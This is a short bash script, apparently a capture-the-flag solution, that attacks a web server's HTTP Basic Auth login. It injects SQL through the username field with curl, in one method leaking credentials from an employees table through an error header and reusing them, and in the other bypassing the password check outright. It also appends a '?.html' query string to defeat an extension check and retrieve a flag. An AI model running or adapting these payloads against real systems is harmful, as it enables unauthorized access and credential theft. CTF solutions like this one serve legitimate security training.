#!/bin/bash

if [[ "$#" -ne "1" ]]; then
    echo "Usage: solution.sh <webserver>"
    exit
fi

#many ways to bypass, can leak creds, as shown, or just bypass the password check completely

echo "Testing credential leak (method 1)..."

#more complicated (but cooler) method: leak some legit creds to bypass the user check...
leak=`curl -vu "\" OR username=(SELECT username FROM employees LIMIT 1) UNION SELECT username FROM employees WHERE username=(SELECT username FROM employees LIMIT 1)--:123" "http://$1/employees-only/flag?.html" 2>&1 |grep X-Error`
creds=`echo "$leak" | sed 's/.*\[(u'\''//g;s/'\''.*(u'\''/ /g;s/'\''.*//g' | awk '{printf("%s:%s",$2,$1)}'` 
echo "Got creds: $creds"
#in either case, you must end with .html, so to get flag pass it as a QUERY string to bypass the extention check
curl -u "$creds" "http://$1/employees-only/flag?.html"


echo "Testing auth bypass (method 2)..."

#more elegent method, but nothing leaked:
curl -u "\" UNION SELECT \":" "http://$1/employees-only/flag?.html"

echo "Done. Both should have producted the flag."
